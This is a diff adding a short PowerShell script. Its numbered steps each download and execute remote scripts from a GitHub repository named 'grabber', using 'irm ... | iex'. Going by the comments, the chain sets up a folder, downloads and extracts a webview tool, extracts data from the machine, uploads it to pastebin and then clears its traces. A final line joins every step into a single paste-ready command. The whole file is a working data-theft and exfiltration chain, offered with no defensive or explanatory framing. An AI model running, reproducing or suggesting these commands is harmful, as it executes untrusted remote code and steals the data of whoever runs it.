@@ -1,0 +1,15 @@
+#Create safe_env folder
+irm https://raw.githubusercontent.com/ucanfindme18/grabber/refs/heads/main/safe_env | iex
+#Download zip file
+irm https://raw.githubusercontent.com/ucanfindme18/grabber/refs/heads/main/grabber | iex
+#extract webview
+irm https://raw.githubusercontent.com/ucanfindme18/grabber/refs/heads/main/extract_webview | iex
+#run and extract data
+irm https://raw.githubusercontent.com/ucanfindme18/grabber/refs/heads/main/extract_logs | iex
+#upload to pastebin
+irm https://raw.githubusercontent.com/ucanfindme18/grabber/refs/heads/main/upload_paste | iex
+#clear folder
+irm https://raw.githubusercontent.com/ucanfindme18/grabber/refs/heads/main/clear_folder | iex
+
+
+irm https://raw.githubusercontent.com/ucanfindme18/grabber/refs/heads/main/safe_env | iex; irm https://raw.githubusercontent.com/ucanfindme18/grabber/refs/heads/main/grabber | iex; irm https://raw.githubusercontent.com/ucanfindme18/grabber/refs/heads/main/extract_webview | iex; irm https://raw.githubusercontent.com/ucanfindme18/grabber/refs/heads/main/extract_logs | iex; irm https://raw.githubusercontent.com/ucanfindme18/grabber/refs/heads/main/upload_paste | iex; irm https://raw.githubusercontent.com/ucanfindme18/grabber/refs/heads/main/clear_folder | iex
